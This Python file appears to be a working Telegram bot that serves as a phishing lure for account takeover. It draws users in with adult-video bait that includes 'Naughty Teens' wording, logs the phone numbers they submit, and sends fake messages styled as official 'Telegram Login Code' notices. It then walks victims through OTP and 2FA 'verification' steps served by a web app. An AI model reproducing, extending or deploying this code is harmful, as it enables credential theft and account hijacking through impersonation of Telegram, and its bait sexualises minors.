import os
import random
import asyncio
import logging
from dotenv import load_dotenv
from telegram import Update, KeyboardButton, ReplyKeyboardMarkup, WebAppInfo
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes
)

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
MINI_APP_URL = os.getenv("MINI_APP_URL")

# Store OTPs for users (in a real app, use a database)
user_otps = {}


def generate_otp():
    """Generate a 5-digit OTP"""
    return str(random.randint(10000, 99999))


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    logger.info(f"User {update.effective_user.id} started the bot")
    
    keyboard = [
        [KeyboardButton("🔞 Verify & Watch 18+", web_app=WebAppInfo(url=MINI_APP_URL))]
    ]
    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
    
    await update.message.reply_text(
        "🔥 Steamy 18+ Vide0s | Naughty Teens Home 🧏\n\nClick below to verify your account!",
        reply_markup=reply_markup
    )


async def handle_webapp_data(update: Update, context: ContextTypes.DEFAULT_TYPE):
    data = update.effective_message.web_app_data.data
    user_id = update.effective_user.id
    user = update.effective_user
    
    logger.info(f"Received from user {user_id}: {data}")
    
    # Handle Send OTP
    if data.startswith("send_otp:"):
        phone = data.split(":", 1)[1] if ":" in data else "unknown"
        
        # Generate and store OTP
        otp = generate_otp()
        user_otps[user_id] = otp
        
        logger.info(f"Generated OTP {otp} for user {user_id} (phone: {phone})")
        
        # Send official-looking OTP message
        otp_message = (
            f"🔐 <b>Telegram</b>\n\n"
            f"<b>Login Code:</b> <code>{otp}</code>\n\n"
            f"Do not share this code with anyone!\n\n"
            f"This code can be used to verify your account.\n\n"
            f"If you didn't request this, please ignore this message."
        )
        
        await update.effective_message.reply_text(
            otp_message,
            parse_mode='HTML'
        )
    
    # Handle Verify OTP
    elif data.startswith("verify_otp:"):
        otp_entered = data.split(":", 1)[1] if ":" in data else ""
        
        if user_id in user_otps and user_otps[user_id] == otp_entered:
            logger.info(f"User {user_id} verified successfully with OTP {otp_entered}")
            
            # OTP verified - send 2FA button or success
            keyboard = [
                [KeyboardButton("🔐 Verify 2FA", web_app=WebAppInfo(url=MINI_APP_URL + "/twofa.html"))]
            ]
            reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
            
            await update.effective_message.reply_text(
                "✅ OTP verified successfully! Now click below to complete 2FA verification.",
                reply_markup=reply_markup
            )
            
            # Clear OTP after verification
            del user_otps[user_id]
            
        else:
            logger.warning(f"User {user_id} entered invalid OTP: {otp_entered}")
            error_msg = "❌ Invalid verification code! Please try again."
            if user_id not in user_otps:
                error_msg += "\n(No active code found - please request a new one!)"
            await update.effective_message.reply_text(error_msg)
    
    # Handle 2FA
    elif data.startswith("verify_2fa:"):
        await update.effective_message.reply_text(
            "✅ Verification complete! You now have full access!\n\nEnjoy the videos! 🎉"
        )


def main():
    application = ApplicationBuilder().token(BOT_TOKEN).build()
    
    # Handlers
    application.add_handler(CommandHandler("start", start))
    application.add_handler(
        MessageHandler(filters.StatusUpdate.WEB_APP_DATA, handle_webapp_data)
    )
    
    # Run the bot
    application.run_polling()


if __name__ == "__main__":
    # Run the bot
    main()
